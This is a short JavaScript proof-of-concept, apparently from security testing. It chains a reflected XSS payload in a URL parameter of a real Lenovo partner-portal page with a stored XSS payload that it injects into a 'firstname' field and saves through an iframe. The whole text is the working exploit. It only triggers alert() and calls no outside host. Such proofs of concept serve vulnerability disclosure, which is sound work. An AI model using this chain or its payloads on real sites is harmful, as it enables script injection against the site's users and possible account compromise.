var frame = document.createElement("iframe");
frame.addEventListener("load", function() {
  setTimeout(function() {
    frame.contentDocument.getElementById("firstname").value = '<img src="q" onerror="alert(5555)">';
    frame.contentDocument.getElementsByClassName("save")[0].click();
    setTimeout(function() {
      console.log("CHANGED!");
    }, 2000);
  }, 1000);
});
frame.src = "https://www.lenovopartnerhub.com/en-GB/group/morocco-site/bid-request-old?p_p_id=com_lenovo_velocity_bid_portlet_BidRequestPortlet_INSTANCE_JAsFpbcly03b&_com_lenovo_velocity_bid_portlet_BidRequestPortlet_INSTANCE_JAsFpbcly03b_statusFilter=%22%2F%3E%3cimg%20src%3dq%20onerror%3Dalert%28%31%29%3e%2F%2F";
document.body.appendChild(frame);
